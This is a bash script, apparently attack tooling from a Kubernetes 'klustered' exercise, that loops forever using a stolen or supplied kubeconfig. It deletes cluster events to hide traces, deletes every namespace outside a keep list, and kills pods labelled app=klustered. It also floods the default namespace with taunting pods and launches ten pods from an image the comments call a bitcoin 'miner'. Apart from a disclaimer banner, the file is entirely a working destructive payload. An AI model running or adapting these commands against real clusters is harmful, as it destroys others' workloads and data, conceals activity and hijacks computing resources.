#!/bin/bash
# Copyright © 2021 Kris Nóva <kris@nivenly.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http:#www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

echo ""
echo ""
echo  " ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗  "
echo  " ████╗  ██║██╔═████╗██║   ██║██╔══██╗ "
echo  " ██╔██╗ ██║██║██╔██║██║   ██║███████║ "
echo  " ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║ "
echo  " ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║ "
echo  " ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝ "
echo ""
echo " [author] kris nóva <kris@nivenly.com>"
echo ""
echo " This is for security research and"
echo "  education only. please use responsibly."
echo ""


function hook() {
    # ----------------------------------------------------------
    # Here is where we can repeat any bash command with a working
    # Kubernetes kubeconfig
    #
    # Keep it secret. Keep it safe.
    #
    # ----

    kubectl delete events --all
    kubectl delete events --all -n kube-system

    # keep our boops but delete their boops
    for ns in $(kubectl get ns -o jsonpath="{.items[*].metadata.name}"); do
      if [ "$ns" = "kube-system" ] || [ "$ns" = "n0va" ] || [ "$ns" = "kube-public" ] || [ "$ns" = "default" ] || [ "$ns" = "kube-node-lease" ] || [ "$ns" = "cilium" ]  || [ "$ns" = "metallb-system" ]  || [ "$ns" = "rook-ceph" ]; then
        continue
      fi
      # Delete all namespaces other than those ^
      kubectl delete namespace $ns
    done

    # we know the workload had "klustered" labels so let's also fuck with those
    kubectl delete po -l app=klustered --all-namespaces

    # let's have fun in the default namespace
    kubectl run "1--I-------------------------------I" --image busyboxy
    kubectl run "1--I-------------------------------I" --image busyboxy
    kubectl run "2--o-kris-n0va-is-a-professional---o" --image busyboxy
    kubectl run "3--o-grown-up-business-computer----o" --image busyboxy
    kubectl run "4--o-person-who-does-very-serious--o" --image busyboxy
    kubectl run "5--o-computer-boops-for-her-career-o" --image busyboxy
    kubectl run "6--o-------------------------------I" --image busyboxy
    kubectl run "7--I------------n0va---------------I" --image busyboxy

    # delete


    # Here is our bitcoin "miner"
    kubectl create namespace n0va
    kubectl run n0va-0 --image krisnova/n0va -n n0va
    kubectl run n0va-1 --image krisnova/n0va -n n0va
    kubectl run n0va-2 --image krisnova/n0va -n n0va
    kubectl run n0va-3 --image krisnova/n0va -n n0va
    kubectl run n0va-4 --image krisnova/n0va -n n0va
    kubectl run n0va-5 --image krisnova/n0va -n n0va
    kubectl run n0va-6 --image krisnova/n0va -n n0va
    kubectl run n0va-7 --image krisnova/n0va -n n0va
    kubectl run n0va-8 --image krisnova/n0va -n n0va
    kubectl run n0va-9 --image krisnova/n0va -n n0va
    # ----
    #
    # ---------------------------------------------------------
    sleep 3 # sleep
}

while true; do
  hook
done
